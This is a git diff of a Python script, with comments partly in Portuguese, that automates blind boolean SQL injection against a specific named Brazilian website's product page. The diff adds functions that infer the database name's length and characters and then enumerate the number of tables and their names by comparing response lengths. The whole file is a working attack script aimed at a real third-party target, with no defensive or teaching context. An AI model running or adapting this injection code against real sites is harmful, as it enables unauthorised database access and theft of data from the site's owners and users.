@@ -3,85 +3,138 @@ import requests
 
 # ---------- * constants * ----------
 
-LETRAS = ["A", "E", "O", "S", "R", "I", "N", "D", "M", "U",
-            "T", "C", "L", "P", "V", "G", "H", "Q", "B", "F",
-            "Z", "J", "X", "K", "W", "Y", "_", "-", ".", "0", "1",
+LETRAS = ["a", "e", "o", "s", "r", "i", "n", "d", "m", "u",
+            "t", "c", "l", "p", "v", "g", "h", "q", "b", "f",
+            "z", "j", "x", "k", "w", "y", "_", "-", ".", "0", "1",
             "2", "3", "4", "5", "6", "7", "8", "9", ":", "?",
             "@", "!", "#", "$", "%", "&", "*", "(", ")",
             "+", "="]
 
 URL = "https://www.adtecnet.com.br/produto.php?id=19"
-DB_NAME = "gerencialnet"
 
-# ---------- * functions * ----------
+# ---------- * FUNCTIONS * ----------
 
 # def get_request(query): 
 #     new_url = URL + query
 #     response = requests.get(new_url) # .. make request ..
 #     content = response.content # .. gets request content ..
-#     content_length_new = len(content) # .. gets request content length ..
+#     request_content_len_new = len(content) # .. gets request content length ..
 
-#     return content_length_new
+#     return request_content_len_new
+
+# .. finds database name length ..
+def gets_dbname_length(request_content_len):
+    i = 1
+    dbname_length = 0
+
+    while dbname_length == 0:
+        print(f"trying length on dbname: {i}")
+        new_url = URL + f"%20and%20IF(length(database())={i},1,NULL)" # .. sets query ..
+        response = requests.get(new_url) # .. make request ..
+        content = response.content # .. gets request content ..
+        content_length_new = len(content) # .. gets content request length ..
+
+        # .. if query returns true, meaning database name length was found ..
+        if content_length_new == request_content_len:
+            dbname_length = i
+            print(f"FOUND DBNAME LENGTH: {dbname_length}")
+
+        # .. if returns false, tries next number ..
+        else:
+            i += 1
+    
+    return dbname_length
+
+
+# .. finds database name ..
+def gets_dbname(request_content_len, dbname_length):
+    i = 1
+    db_name = []
+    
+    # .. while i less than dbname length ..
+    while i <= dbname_length:
+        for letra in LETRAS:
+            print(f"trying letter on dbname: {letra}")
+            new_url = URL + f"%20and%20IF(SUBSTRING(database(),{i},1)='{letra}',1,NULL)" # .. sets query ..
+            
+            response = requests.get(new_url) # .. make request ..
+            content = response.content # .. gets request content ..
+            content_length_new = len(content) # .. gets request content length ..
+
+            # .. if query returns true, meaning letter is in dbname ..
+            if content_length_new == request_content_len:
+                db_name.append(letra.lower()) # .. adds letter to array ..
+                print(f"FOUND LETTER: {db_name}")
+                break
+
+        i += 1 # .. tries for next letter in dbname ..
+
+    db_name_str = "".join(db_name)
+
+    return db_name_str.lower()
+
 
 # .. find qty of tables
-def tbQtd(content_length):
+def gets_qty_tables(request_content_len):
     i = 1
     content_length_new = 0
 
     while True:
-        new_url = URL + f"%20and%20IF((select%20count(*)%20from%20information_schema.tables%20where%20table_schema%20=%20%27{DB_NAME}%27)={i},1,NULL)" # .. sets query ..
+        print(f"trying length on qty tables: {i}")
+        new_url = URL + f"%20and%20IF((select%20count(*)%20from%20information_schema.tables%20where%20table_schema%20=%20%27{db_name}%27)={i},1,NULL)" # .. sets query ..
         response = requests.get(new_url) # .. make request ..
         content = response.content # .. gets request content ..
         content_length_new = len(content) # .. gets request content length ..
 
         # .. verifies if query returns true by comparing request content length ..
-        if content_length_new != content_length:
+        if content_length_new != request_content_len:
             i += 1
         else:
             break
 
+    print(f"FOUND QTY OF TABLES: {i}")
     return i
 
 # .. find table's names
-def tbContent(URL, DB_NAME, content_length, LETRAS, qtd_tables):
+def gets_tables_names(db_name, request_content_len, qty_tables):
     array_tables = []
     k = 1
-    l = 0
-    limit = "1"
+    limit = f"1"
 
     # .. pass throught all tables
-    while k < qtd_tables:
+    while k < qty_tables:
         i = 1
         j = 0
         tables = []
 
         while True:
-            new_url = URL + f"%20and%20IF(SUBSTRING((SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27{DB_NAME}%27%20LIMIT%20{limit}),%20{i},%201)%20=%20%27{LETRAS[j]}%27,%201,%20NULL)" # .. sets query ..
+            print(f"trying letter on table name: {LETRAS[j]}")
+            new_url = URL + f"%20and%20IF(SUBSTRING((SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27{db_name}%27%20LIMIT%20{limit}),%20{i},%201)%20=%20%27{LETRAS[j]}%27,%201,%20NULL)" # .. sets query ..
             response = requests.get(new_url) # .. make request ..
             content = response.content # .. gets request content ..
             content_length_new = len(content) # .. gets request content length ..
                 
             # .. if query returns true, meaning letter is in table name ..
-            if content_length_new == content_length:
+            if content_length_new == request_content_len:
                 tables.append(LETRAS[j]) # .. keeps letter found in array ..
                 print(tables)
 
                 table_name = "".join(tables) # .. turns array into string ..
-                query = URL + f"%20and%20IF((SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27{DB_NAME}%27%20LIMIT%20{limit})=%27{table_name}%27,%201,%20NULL)" # .. sets query ..
+                query = URL + f"%20and%20IF((SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27{db_name}%27%20LIMIT%20{limit})=%27{table_name}%27,%201,%20NULL)" # .. sets query ..
 
                 response = requests.get(query) # .. make request ..
                 content = response.content # .. gets request content ..
                 content_length_new = len(content) # .. gets request content length ..
 
                 # .. if query returns true, meaning table name was found ..
-                if content_length_new == content_length:
-                    print(f"nome table: {table_name}")
+                if content_length_new == request_content_len:
+                    print(f"table name: {table_name}")
 
                     array_tables.append(table_name)
                     print("number of tables: " + str(len(array_tables) + 1))
 
                     k += 1 # .. changes limit to get to table number ..
-                    limit = f"{k}, 1"
+                    limit = (f"{k}, 1")
                     break
 
                 # .. if query returns false,  ..
@@ -92,12 +145,14 @@ def tbContent(URL, DB_NAME, content_length, LETRAS, qtd_tables):
             # .. if query returns false, tries next letter ..
             else:
                 j += 1
-                print("...\r")
 
     return array_tables
 
 
 if __name__ == '__main__':
+
+    database: str = 'database'
+    print(f"{database:_^20}")
 
     # .. verifies if url is valid ..
     if '=' in URL:
@@ -109,14 +164,17 @@ if __name__ == '__main__':
 
     # .. if its up ..
     if response.status_code == 200:
-            content = response.content # .. gets request content ..
-            content_length = len(content) # .. gets request content length ..
-            print(f"content {content_length}")
-            
-            qtd_tables = tbQtd(content_length) # .. gets qty of tables ..
-            
-            tb_name = tbContent(URL, DB_NAME, content_length, LETRAS, qtd_tables) # .. gets table's names ..
-            print(f"Nome das tabelas: {tb_name}")
+        request_content = response.content # .. gets request content ..
+        request_content_len = len(request_content) # .. gets request content length ..
+        print(f"DEFAULT REQUEST CONTENT LENGTH: {request_content_len}")
+
+        dbname_length = gets_dbname_length(request_content_len) # .. gets db name length ..
+        db_name = gets_dbname(request_content_len, dbname_length) # .. gets db ..
+        print(f"DATABASE NAME: {db_name}")
+
+        qty_tables = gets_qty_tables(request_content_len) # .. gets qty of tables ..
+        tables_names = gets_tables_names(db_name, request_content_len, qty_tables) # .. gets tables names ..
+        print(f"TABLES NAMES: {tables_names}")
             
     else:
         print("O servidor não respondeu :(")
